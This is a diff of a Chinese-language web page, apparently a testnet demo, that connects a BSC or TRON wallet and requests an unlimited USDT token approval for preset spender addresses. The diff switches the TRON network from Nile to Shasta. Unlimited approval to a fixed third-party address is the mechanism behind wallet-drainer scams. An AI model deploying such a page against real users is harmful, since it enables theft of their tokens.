@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT 授权示例 (测试网版本)</title>
+    <title>USDT 授权示例 (BSC Testnet / TRON Shasta)</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
@@ -20,17 +20,17 @@
 <body>
 
 <div class="container">
-    <h1>USDT 代币授权示例 (测试网版本)</h1>
+    <h1>USDT 代币授权示例 (BSC Testnet / TRON Shasta)</h1>
     
     <div id="status" class="status">未连接钱包</div>
     
-    <button onclick="connectWallet()">连接钱包 (BSC Testnet/TRON Nile)</button>
+    <button onclick="connectWallet()">连接钱包 (BSC Testnet/TRON Shasta)</button>
     <button id="approve-button" onclick="approveToken()" disabled>授权 USDT (测试网)</button>
 
     <p style="margin-top: 30px;">
         <strong class="warning">--- 🚨 替换警告 🚨 ---</strong>
         <br>
-        <strong>您必须替换以下代码中的 `YOUR_..._SPENDER_ADDRESS` 为您在【测试网】部署的合约地址！</strong>
+        <strong>您必须替换以下代码中的 `YOUR_..._SPENDER_ADDRESS` 为您在【相应测试网】部署的合约地址！</strong>
     </p>
 </div>
 
@@ -38,12 +38,12 @@
     // --- 配置: [测试网] USDT 代币和 Spender 地址 ---
     // BSC 测试网 USDT 地址
     const BSC_TOKEN_ADDRESS = '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd'; 
-    // TRON Nile 测试网 USDT 地址
-    const TRON_TOKEN_ADDRESS = 'TXYZopYRdj2D9XRtbG4wjrPOcLo7wEa9bV'; 
+    // 变更: TRON Shasta 测试网 USDT 地址
+    const TRON_TOKEN_ADDRESS = 'TG3XXyExBkPp9nzdajDZsozA7U6dqt1NSP'; 
 
     // 🚨 必须替换为您的目标合约地址 (Spender) 🚨
     const BSC_SPENDER_ADDRESS = '0x8e31f625ED75fab5E826766a1635a8750A09d7FB'; // 替换为你在 BSC 测试网的合约地址
-    const TRON_SPENDER_ADDRESS = 'TK598JNkdW3CfQDWKHnT2Q71H3Q2CYS97b'; // 替换为你在 TRON Nile 测试网的合约地址
+    const TRON_SPENDER_ADDRESS = 'TK598JNkdW3CfQDWKHnT2Q71H3Q2CYS97b'; // 替换为你在 TRON Shasta 测试网的合约地址
 
     // 授权金额 (使用 uint256 的最大值，代表 "无限" 授权)
     const MAX_APPROVAL_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
@@ -74,7 +74,7 @@
         }
     }
 
-    // --- EVM (BSC) 连接逻辑 ---
+    // --- EVM (BSC) 连接逻辑 (保持不变) ---
     async function connectEVM() {
         try {
             web3 = new Web3(window.ethereum);
@@ -84,8 +84,7 @@
             currentAccount = accounts[0];
             
             const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-            // 变更: BSC 测试网的 Chain ID 是 '0x61' (十六进制的97)
-            if (chainId !== '0x61') {
+            if (chainId !== '0x61') { // BSC Testnet Chain ID
                 resetState();
                 updateStatus(`请将钱包网络切换到 BSC 测试网 (BSC Testnet)。当前网络 ID: ${chainId}`, 'error');
                 return;
@@ -99,21 +98,21 @@
         }
     }
 
-    // --- TRON 连接逻辑 ---
+    // --- TRON 连接逻辑 (适配 Shasta) ---
     async function connectTron() {
         try {
             updateStatus('正在等待 TRON 钱包就绪...');
             
             const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
             if (res.code === 200) {
-                // 检查当前是否是 Nile 网
-                if (window.tronWeb.fullNode.host.includes('nileex')) {
+                // 变更: 检查当前是否是 Shasta 网
+                if (window.tronWeb.fullNode.host.includes('shasta')) {
                     currentAccount = window.tronWeb.defaultAddress.base58;
                     currentNetwork = 'TRON';
-                    updateStatus(`已连接 TRON Nile 测试网: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
+                    updateStatus(`已连接 TRON Shasta 测试网: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
                 } else {
                     resetState();
-                    updateStatus('请将 TronLink 钱包切换到 Nile 测试网 (Nile Test Network)。', 'error');
+                    updateStatus('请将 TronLink 钱包切换到 Shasta 测试网 (Shasta Test Network)。', 'error');
                 }
             } else {
                  throw new Error("TRON 账户请求被拒绝。");
@@ -145,7 +144,7 @@
         }
     }
 
-    // --- BSC (EVM) 授权实现 ---
+    // --- BSC (EVM) 授权实现 (保持不变) ---
     async function approveBSCToken() {
         if (BSC_SPENDER_ADDRESS === 'YOUR_BSC_SPENDER_ADDRESS') {
              updateStatus('错误：请在代码中替换 BSC_SPENDER_ADDRESS！', 'error');
@@ -169,14 +168,14 @@
         }
     }
 
-    // --- TRON 授权实现 ---
+    // --- TRON 授权实现 (适配 Shasta) ---
     async function approveTRONToken() {
         if (TRON_SPENDER_ADDRESS === 'YOUR_TRON_SPENDER_ADDRESS') {
              updateStatus('错误：请在代码中替换 TRON_SPENDER_ADDRESS！', 'error');
              return;
         }
         
-        updateStatus('正在请求 TRON Nile 测试网 (USDT) 代币授权...');
+        updateStatus('正在请求 TRON Shasta 测试网 (USDT) 代币授权...');
         try {
             const contract = await window.tronWeb.contract().at(TRON_TOKEN_ADDRESS);
             const txID = await contract.approve(TRON_SPENDER_ADDRESS, MAX_APPROVAL_AMOUNT).send({ feeLimit: 150000000, callValue: 0 });
